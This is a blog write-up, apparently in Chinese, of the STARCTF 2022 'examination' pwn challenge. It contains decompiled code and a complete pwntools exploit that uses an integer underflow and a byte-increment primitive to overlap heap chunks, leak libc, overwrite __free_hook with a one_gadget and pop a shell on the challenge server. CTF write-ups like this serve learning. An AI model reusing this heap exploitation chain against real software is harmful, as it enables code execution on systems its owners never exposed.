---
layout: post
title: 'STARCTF 2022 examination WP'
subheading: heap feng shui
author: dayfly
categories: WP
banner:
  video: null
  loop: true
  volume: 1
  start_at: 8.5
  image: https://images.pexels.com/photos/414612/pexels-photo-414612.jpeg
  opacity: 1
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 5em; font-weight: bold; text-decoration: none; min-width: 1100px"
  subheading_style: "color: gold"
tags: [heap feng shui, chunk overlapping]
# sidebar: []
---

## 介绍

本题需熟练掌握 teacher 和 student 身份频繁切换

思路大概是这样的，程序有一个打印堆地址的函数，以此为突破口

### student pray
让 `qword_5080[a1] + 24LL == 0`
```c
int __fastcall pray(int a1)
{
  puts("prayer...Good luck to you");
  *(_DWORD *)(qword_5080[a1] + 24LL) ^= 1u;
  return puts("finish");
}
```

### teacher give a score
让 v2 -= 10，成为一个负数，同时也是一个很大的无符号数， 
从而 `*(_DWORD *)(*(_QWORD *)qword_5080[i] + 4LL) > 0x59`

```c
unsigned __int64 give_a_score()
{
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int v2; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("marking testing papers.....");
  for ( i = 0; i < dword_503C; ++i )
  {
    if ( read(fd, buf, 8uLL) != 8 )
    {
      puts("read_error");
      exit(-1);
    }
    buf[0] &= 0x7Fu;
    v2 = buf[0] % (10 * **(_DWORD **)qword_5080[i]);
    printf("score for the %dth student is %d\n", i, v2);
    if ( *(_DWORD *)(qword_5080[i] + 24LL) == 1 )
    {
      puts("the student is lazy! b@d!");
      v2 -= 10;
    }
    *(_DWORD *)(*(_QWORD *)qword_5080[i] + 4LL) = v2;
  }
  puts("finish");
  return __readfsqword(0x28u) ^ v4;
}
```

### student check for reveiw
泄露一个堆地址，并且可以让某个地址的值自增 1

```c
unsigned __int64 __fastcall check_review(int a1)
{
  _BYTE *v1; // rax
  char nptr[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( *(_DWORD *)(qword_5080[a1] + 28LL) == 1 )
  {
    puts("already gained the reward!");
  }
  else
  {
    if ( *(_DWORD *)(*(_QWORD *)qword_5080[a1] + 4LL) > 0x59u )
    {
      printf("Good Job! Here is your reward! %p\n", (const void *)qword_5080[a1]);
      printf("add 1 to wherever you want! addr: ");
      sub_13D5(0LL, nptr, 16LL);
      v1 = (_BYTE *)atol(nptr);
      ++*v1;
      *(_DWORD *)(qword_5080[a1] + 28LL) = 1;
    }
    if ( *(_QWORD *)(*(_QWORD *)qword_5080[a1] + 8LL) )
    {
      puts("here is the review:");
      write(1, *(const void **)(*(_QWORD *)qword_5080[a1] + 8LL), *(int *)(*(_QWORD *)qword_5080[a1] + 16LL));
    }
    else
    {
      puts("no reviewing yet!");
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

### teacher write a view
可以重复修改 comment 的内容，反复利用 1 ~ 3步，通过地址自增 1，使 comment 结构的 size 变大，从而对高地址堆块进行 overflow，
并以此实现泄露 libc 地址，并最终打 one_gadget 到 free_hook

```c
unsigned __int64 write_a_review()
{
  __int64 v0; // rbx
  int v2; // [rsp+10h] [rbp-20h] BYREF
  int v3; // [rsp+14h] [rbp-1Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  v3 = 0;
  printf("which one? > ");
  __isoc99_scanf("%d", &v3);
  if ( *(_QWORD *)(*(_QWORD *)qword_5080[v3] + 8LL) )
  {
    puts("enter your comment:");
    read(0, *(void **)(*(_QWORD *)qword_5080[v3] + 8LL), *(int *)(*(_QWORD *)qword_5080[v3] + 16LL));
    puts("finish");
  }
  else
  {
    printf("please input the size of comment: ");
    __isoc99_scanf("%d", &v2);
    if ( v2 <= 1023 && v2 > 0 )
    {
      v0 = *(_QWORD *)qword_5080[v3];
      *(_QWORD *)(v0 + 8) = calloc(1uLL, v2);
      puts("enter your comment:");
      read(0, *(void **)(*(_QWORD *)qword_5080[v3] + 8LL), v2);
      *(_DWORD *)(*(_QWORD *)qword_5080[v3] + 16LL) = v2;
      puts("finish");
    }
    else
    {
      puts("wrong length :'(");
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```


## 利用
```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './examination'
elf = ELF(binary)
libc_path = './libc-2.31.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('124.70.130.92', 60001)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add_a_stu(que_num):
        sla('choice>> ', '1')
        sla('enter the number of questions: ', str(que_num))

def give_a_score():
        sla('choice>> ', '2')
        ru('marking testing papers.....\n')

def write_a_review(index, first, com_sz, comment):
        sla('choice>> ', '3')
        sla('which one? > ', str(index))
        if first == 1:
                sla('please input the size of comment: ', str(com_sz))
        sla('enter your comment:\n', comment)

def del_stu(index):
        sla('choice>> ', '4')
        sla('which student id to choose?\n', str(index))

def never_pray(index):
        sla('choice>> ', '4')
        sla('which student id to choose?\n', str(index))

def check_review(leak, addr=None):
        sla('choice>> ', '2')
        if leak == 1:
                ru('Good Job! Here is your reward! ')
                reward = int(ru('\n')[:-1], 16)
                if not addr:
                        addr = str(reward) + '1'
                sla('add 1 to wherever you want! addr: ', addr)
                log.success('reward ' + hex(reward))
                return reward

        ru('here is the review:')
        print(rl())

def pray():
        sla('choice>> ', '3')

def set_mode(set_md, cont, score):
        sla('choice>> ', '4')
        if set_md == 1:
                sa('enter your mode!\n', cont)
        else:
                sla('enter your pray score: 0 to 100', str(score))

def change_role(is_tea_stu):
        sla('choice>> ', '5')
        sla('role: <0.teacher/1.student>: ', str(is_tea_stu))

def change_id(idx):
        sla('choice>> ', '6')
        sla('input your id: ', str(idx))

sla('role: <0.teacher/1.student>: ', '0')
add_a_stu(1)    # 0
add_a_stu(1)    # 1
add_a_stu(1)    # 2
# dbg()


write_a_review(0, 1, 0x3ff, b'b'*0x80)
give_a_score()
change_role(1)
check_review(0, p64(1))
# dbg()

# pray2, add 1
change_role(1)
change_id(2)
pray()
change_role(0)
give_a_score()
change_role(1)
change_id(2)
sla('choice>> ', '2')
ru('Good Job! Here is your reward! ')
chunk0 = int(ru('\n')[:-1], 16)
log.success('reward ' + hex(chunk0))
sla('add 1 to wherever you want! addr: ', str(chunk0-0x5f)+'1')
# dbg()

change_role(0)
add_a_stu(1)    # 3
change_role(1)
change_id(3)
set_mode(1, b'c'*0x8, 60)
# dbg()

change_role(0)
add_a_stu(1)    # 4
write_a_review(3, 1, 0x3ff, b'b'*(0x408)+p64(1))
# dbg()

change_role(1)
change_id(4)
set_mode(1, b'c'*0x8, 60)
# dbg()

# pray1, add 1
change_role(1)
change_id(1)
pray()
change_role(0)
give_a_score()
change_role(1)
change_id(1)
sla('choice>> ', '2')
ru('Good Job! Here is your reward! ')
sla('add 1 to wherever you want! addr: ', str(chunk0+0x4a1)+'1')
log.success('reward ' + hex(chunk0))
log.success('write addr ' + hex(chunk0+0x4d1))
# dbg()

# tea
change_role(0)
pay =  b'b'*(0x400)+p64(0)+p64(0x4e1)
pay += p64(chunk0+0x490) + p64(0) + p64(chunk0+0x4b0) + p64(0)*2 + p64(0x21) + p64(0x0000000300000001) 
pay += p64(chunk0+0x530) + p64(0x00000000000004ff) 
pay += p64(0x31) + p64(0) * 5 + p64(0x31) 
pay += p64(chunk0 + 0x4e0) + p64(chunk0 + 0x4b0) + p64(0x10)
pay += p64(0) * 2 + p64(0x21) + p64(0x0000100000000001) + p64(0) + p64(0) + p64(0x411)
write_a_review(0, 0, 0x400,pay)
# dbg()

change_role(0)
del_stu(3)
del_stu(2)
# dbg()

add_a_stu(1)    # 3
# dbg()

change_role(1)
change_id(4)
sla('choice>> ', '2')
ru('Good Job! Here is your reward! ')
sla('add 1 to wherever you want! addr: ', str(chunk0-0x5f)+'1')
ru('here is the review:')
main_arena = uu64(ru('\x7f')[-6:])
libc_base = main_arena - 0x1ecbe0
free_hook = libc_base + libc.symbols['__free_hook']

# 2.23-amd64:   0x45216, 0x4526a, 0xf02a4, 0xf1147
# 2.27-amd64:   0x4f2c5, 0x4f322, 0x10a38c
# 2.31-amd64:   0xe3b2e, 0xe3b31, 0xe3b34
one_gadget = libc_base + 0xe3b31
log.success('libc_base ' + hex(libc_base))
log.success('free_hook ' + hex(free_hook))
log.success('one_gadget ' + hex(one_gadget))
log.success('reward ' + hex(chunk0))
# dbg()

# overwrite comment ptr of stu 4
change_role(0)
pay =  b'b'*(0x400)+p64(0)+p64(0x31)
pay += p64(chunk0+0x490) + p64(0)*4 + p64(0x21) + p64(1) 
pay += p64(0)*2 + p64(0x491)
pay += p64(main_arena) + p64(main_arena) 
pay += p64(0)*3 + p64(0x31) 
pay += p64(chunk0 + 0x4e0) + p64(free_hook) + p64(0x10)
pay += p64(0)
write_a_review(0, 0, 0x400,pay)
# dbg()

# overwrite free_hook
write_a_review(4, 0, 0, p64(one_gadget))
# dbg()

del_stu(0)
itr()

# mark, learn chunk overlapping and heap fengshui
```